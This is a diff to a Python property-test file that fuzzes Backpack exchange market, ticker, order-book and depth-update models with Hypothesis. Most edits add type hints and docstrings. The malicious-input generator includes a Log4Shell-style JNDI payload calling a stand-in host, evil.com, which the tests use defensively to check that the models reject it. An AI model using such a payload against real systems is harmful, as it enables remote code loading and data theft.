@@ -15,31 +15,27 @@ Property testing ensures comprehensive coverage of market data edge cases and ad
 """
 
 from decimal import Decimal
-from typing import Any
+from typing import Any, cast
 
 import pytest
-from hypothesis import given, strategies as st, assume
+from hypothesis import assume, given, strategies as st
 from hypothesis.strategies import SearchStrategy
 from pydantic import ValidationError
 
 from cyberdelta.apis.backpack.models.bp_raw_market import (
     BackpackRawDepthUpdateEvent,
     BackpackRawMarketResponse,
-    BackpackRawOpenInterest,
     BackpackRawOrderBook,
+    BackpackRawOrderBookFilters,
     BackpackRawPriceFilter,
     BackpackRawQuantityFilter,
-    BackpackRawOrderBookFilters,
-    BackpackRawTickerEvent,
     BackpackRawTickerResponse,
 )
 from cyberdelta.apis.exceptions.field_validation import DecimalFiniteError
 from cyberdelta.apis.exceptions.parsing import SequenceLengthError, StructureTypeError
 from cyberdelta.exceptions.field_validation import TypeFieldError
 from cyberdelta.exceptions.parsing import (
-    DateTimeParsingError,
     EmptyStringError,
-    TimestampFormatError,
 )
 
 
@@ -49,11 +45,15 @@ from cyberdelta.exceptions.parsing import (
 
 
 def market_decimal_strategy() -> SearchStrategy[str]:
-    """Generate decimal strings for market financial fields."""
+    """Generate decimal strings for market financial fields.
+
+    Returns:
+        A Hypothesis strategy for decimal strings used in market data.
+    """
     return st.one_of([
         # Market price/volume amounts
-        st.decimals(min_value=Decimal("0"), max_value=Decimal("10000000"), places=8).map(str),
-        st.decimals(min_value=Decimal("0"), max_value=Decimal("1000000"), places=6).map(str),
+        st.decimals(min_value=Decimal(0), max_value=Decimal(10000000), places=8).map(str),
+        st.decimals(min_value=Decimal(0), max_value=Decimal(1000000), places=6).map(str),
         # Common market values
         st.just("0"),
         st.just("0.0"),
@@ -69,7 +69,11 @@ def market_decimal_strategy() -> SearchStrategy[str]:
 
 
 def market_symbol_strategy() -> SearchStrategy[str]:
-    """Generate valid market symbol strings."""
+    """Generate valid market symbol strings.
+
+    Returns:
+        A Hypothesis strategy for valid market symbol strings.
+    """
     return st.one_of([
         # Common trading pairs
         st.sampled_from(["BTC_USDC", "ETH_USDC", "SOL_USDC", "AVAX_USDC", "ARB_USDC"]),
@@ -89,7 +93,11 @@ def market_symbol_strategy() -> SearchStrategy[str]:
 
 
 def asset_symbol_strategy() -> SearchStrategy[str]:
-    """Generate valid asset symbol strings."""
+    """Generate valid asset symbol strings.
+
+    Returns:
+        A Hypothesis strategy for valid asset symbol strings.
+    """
     return st.one_of([
         # Common assets
         st.sampled_from(["BTC", "ETH", "SOL", "USDC", "USDT", "AVAX", "ARB"]),
@@ -105,7 +113,11 @@ def asset_symbol_strategy() -> SearchStrategy[str]:
 
 
 def market_type_strategy() -> SearchStrategy[str]:
-    """Generate valid market type strings."""
+    """Generate valid market type strings.
+
+    Returns:
+        A Hypothesis strategy for valid market type strings.
+    """
     return st.one_of([
         st.sampled_from(["Spot", "Perpetual", "Future"]),
         st.text(min_size=1, max_size=64).filter(lambda x: x.strip()),
@@ -113,15 +125,23 @@ def market_type_strategy() -> SearchStrategy[str]:
 
 
 def order_book_state_strategy() -> SearchStrategy[str]:
-    """Generate valid order book state strings."""
+    """Generate valid order book state strings.
+
+    Returns:
+        A Hypothesis strategy for valid order book state strings.
+    """
     return st.one_of([
         st.sampled_from(["NORMAL", "HALTED", "SUSPENDED", "MAINTENANCE"]),
         st.text(min_size=1, max_size=64).filter(lambda x: x.strip()),
     ])
 
 
-def timestamp_strategy() -> SearchStrategy[Any]:
-    """Generate valid timestamp values."""
+def timestamp_strategy() -> SearchStrategy[int | float | str | None]:
+    """Generate valid timestamp values.
+
+    Returns:
+        A Hypothesis strategy for valid timestamp values.
+    """
     return st.one_of([
         # Unix timestamps (milliseconds)
         st.integers(min_value=1000000000000, max_value=2000000000000),
@@ -142,8 +162,12 @@ def timestamp_strategy() -> SearchStrategy[Any]:
 
 
 @st.composite
-def price_filter_data(draw) -> dict[str, Any]:
-    """Generate valid price filter data."""
+def price_filter_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid price filter data.
+
+    Returns:
+        Dictionary containing price filter parameters including minPrice, maxPrice, and tickSize.
+    """
     return {
         "minPrice": draw(market_decimal_strategy()),
         "maxPrice": draw(st.one_of([market_decimal_strategy(), st.none()])),
@@ -152,8 +176,12 @@ def price_filter_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def quantity_filter_data(draw) -> dict[str, Any]:
-    """Generate valid quantity filter data."""
+def quantity_filter_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid quantity filter data.
+
+    Returns:
+        Dictionary containing quantity filter parameters.
+    """
     return {
         "minQuantity": draw(market_decimal_strategy()),
         "maxQuantity": draw(st.one_of([market_decimal_strategy(), st.none()])),
@@ -162,8 +190,12 @@ def quantity_filter_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def order_book_filters_data(draw) -> dict[str, Any]:
-    """Generate valid order book filters data."""
+def order_book_filters_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid order book filters data.
+
+    Returns:
+        Dictionary containing order book filters with price and quantity filter data.
+    """
     return {
         "price": draw(price_filter_data()),
         "quantity": draw(quantity_filter_data()),
@@ -171,8 +203,12 @@ def order_book_filters_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def valid_market_response_data(draw) -> dict[str, Any]:
-    """Generate valid market response data structure."""
+def valid_market_response_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid market response data structure.
+
+    Returns:
+        Dictionary containing complete market response data with symbol, filters, and metadata.
+    """
     return {
         "symbol": draw(market_symbol_strategy()),
         "baseSymbol": draw(asset_symbol_strategy()),
@@ -185,8 +221,12 @@ def valid_market_response_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def valid_ticker_response_data(draw) -> dict[str, Any]:
-    """Generate valid ticker response data structure."""
+def valid_ticker_response_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid ticker response data structure.
+
+    Returns:
+        Dictionary containing complete ticker data with prices, volume, and market statistics.
+    """
     return {
         "symbol": draw(market_symbol_strategy()),
         "firstPrice": draw(market_decimal_strategy()),
@@ -202,8 +242,12 @@ def valid_ticker_response_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def valid_ticker_event_data(draw) -> dict[str, Any]:
-    """Generate valid ticker event data structure."""
+def valid_ticker_event_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid ticker event data structure.
+
+    Returns:
+        Dictionary containing ticker event data with abbreviated field names and values.
+    """
     return {
         "s": draw(market_symbol_strategy()),
         "c": draw(market_decimal_strategy()),  # last_price
@@ -219,8 +263,12 @@ def valid_ticker_event_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def order_book_level_data(draw) -> list[Any]:
-    """Generate valid order book level data (price, quantity tuple)."""
+def order_book_level_data(draw: st.DrawFn) -> list[Any]:
+    """Generate valid order book level data (price, quantity tuple).
+
+    Returns:
+        List containing price and quantity values representing an order book level.
+    """
     return [
         draw(market_decimal_strategy()),  # price
         draw(market_decimal_strategy()),  # quantity
@@ -228,8 +276,12 @@ def order_book_level_data(draw) -> list[Any]:
 
 
 @st.composite
-def valid_order_book_data(draw) -> dict[str, Any]:
-    """Generate valid order book data structure."""
+def valid_order_book_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid order book data structure.
+
+    Returns:
+        Dictionary containing order book data with bids, asks, and timestamps.
+    """
     return {
         "bids": draw(st.lists(order_book_level_data(), min_size=0, max_size=10)),
         "asks": draw(st.lists(order_book_level_data(), min_size=0, max_size=10)),
@@ -239,8 +291,12 @@ def valid_order_book_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def valid_depth_update_event_data(draw) -> dict[str, Any]:
-    """Generate valid depth update event data structure."""
+def valid_depth_update_event_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid depth update event data structure.
+
+    Returns:
+        Dictionary containing depth update event data with bids, asks, and update IDs.
+    """
     return {
         "b": draw(
             st.one_of([st.lists(order_book_level_data(), min_size=0, max_size=5), st.none()])
@@ -256,8 +312,12 @@ def valid_depth_update_event_data(draw) -> dict[str, Any]:
     }
 
 
-def malicious_market_strategy() -> SearchStrategy[Any]:
-    """Generate malicious strings for market security testing."""
+def malicious_market_strategy() -> SearchStrategy[str]:
+    """Generate malicious strings for market security testing.
+
+    Returns:
+        A Hypothesis strategy for malicious values to test security boundaries.
+    """
     return st.one_of([
         # Financial manipulation attempts
         st.just("${jndi:ldap://evil.com/steal-prices}"),
@@ -290,8 +350,12 @@ def malicious_market_strategy() -> SearchStrategy[Any]:
     ])
 
 
-def invalid_market_type_strategy() -> SearchStrategy[Any]:
-    """Generate invalid types for market field validation testing."""
+def invalid_market_type_strategy() -> SearchStrategy[object]:
+    """Generate invalid types for market field validation testing.
+
+    Returns:
+        A Hypothesis strategy for invalid type values.
+    """
     return st.one_of([
         st.none(),
         st.integers(),
@@ -316,7 +380,7 @@ class TestBackpackRawMarketResponseProperties:
 
     @given(market_data=valid_market_response_data())
     def test_market_validation_success_properties(self, market_data: dict[str, Any]) -> None:
-        """Property: Valid market data should always create valid BackpackRawMarketResponse objects."""
+        """Property: Valid market data should always create valid objects."""
         # Skip invalid nested filter data
         try:
             # Check price filter decimals
@@ -382,10 +446,10 @@ class TestBackpackRawMarketResponseProperties:
         malicious_value=malicious_market_strategy(),
     )
     def test_market_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: str
     ) -> None:
         """Property: Market model should reject malicious inputs safely."""
-        base_data = {
+        base_data: dict[str, object] = {
             "symbol": "BTC_USDC",
             "baseSymbol": "BTC",
             "quoteSymbol": "USDC",
@@ -411,9 +475,9 @@ class TestBackpackRawMarketResponseProperties:
         field_name=st.sampled_from(["symbol", "baseSymbol", "quoteSymbol", "filters"]),
         invalid_value=invalid_market_type_strategy(),
     )
-    def test_market_type_safety_properties(self, field_name: str, invalid_value: Any) -> None:
+    def test_market_type_safety_properties(self, field_name: str, invalid_value: object) -> None:
         """Property: Market model should enforce strict type safety."""
-        base_data = {
+        base_data: dict[str, object] = {
             "symbol": "BTC_USDC",
             "baseSymbol": "BTC",
             "quoteSymbol": "USDC",
@@ -474,10 +538,17 @@ class TestBackpackRawMarketResponseProperties:
         }
 
         # Update the appropriate filter field
-        if filter_field in ["tickSize", "minPrice"]:
-            market_data["filters"]["price"][filter_field] = decimal_value
+        # Cast needed because hypothesis strategy types are too broad
+
+        filters = cast(dict[str, Any], market_data["filters"])
+        price_filters = cast(dict[str, Any], filters["price"])
+        quantity_filters = cast(dict[str, Any], filters["quantity"])
+
+        field_key = str(filter_field)
+        if field_key in ["tickSize", "minPrice"]:
+            price_filters[field_key] = decimal_value
         else:
-            market_data["filters"]["quantity"][filter_field] = decimal_value
+            quantity_filters[field_key] = decimal_value
 
         try:
             # Check if the value can be parsed as a finite decimal
@@ -510,7 +581,7 @@ class TestBackpackRawTickerResponseProperties:
 
     @given(ticker_data=valid_ticker_response_data())
     def test_ticker_validation_success_properties(self, ticker_data: dict[str, Any]) -> None:
-        """Property: Valid ticker data should always create valid BackpackRawTickerResponse objects."""
+        """Property: Valid ticker data should always create valid objects."""
         # Skip invalid decimal values
         try:
             decimal_fields = [
@@ -554,10 +625,10 @@ class TestBackpackRawTickerResponseProperties:
         malicious_value=malicious_market_strategy(),
     )
     def test_ticker_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: object
     ) -> None:
         """Property: Ticker model should reject malicious inputs safely."""
-        base_data = {
+        base_data: dict[str, object] = {
             "symbol": "BTC_USDC",
             "firstPrice": "50000.00",
             "lastPrice": "50250.50",
@@ -636,7 +707,7 @@ class TestBackpackRawOrderBookProperties:
             st.none(),  # None
         ])
     )
-    def test_order_book_level_validation_properties(self, invalid_level_data: Any) -> None:
+    def test_order_book_level_validation_properties(self, invalid_level_data: object) -> None:
         """Property: Order book levels should be validated properly."""
         order_book_data = {
             "bids": [invalid_level_data],
@@ -705,10 +776,10 @@ class TestBackpackRawDepthUpdateEventProperties:
         malicious_value=malicious_market_strategy(),
     )
     def test_depth_update_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: str
     ) -> None:
         """Property: Depth update model should reject malicious inputs safely."""
-        base_data = {
+        base_data: dict[str, list[list[str]] | str | int] = {
             "b": [["100.0", "1.0"]],
             "a": [["101.0", "1.0"]],
             "U": "12345",
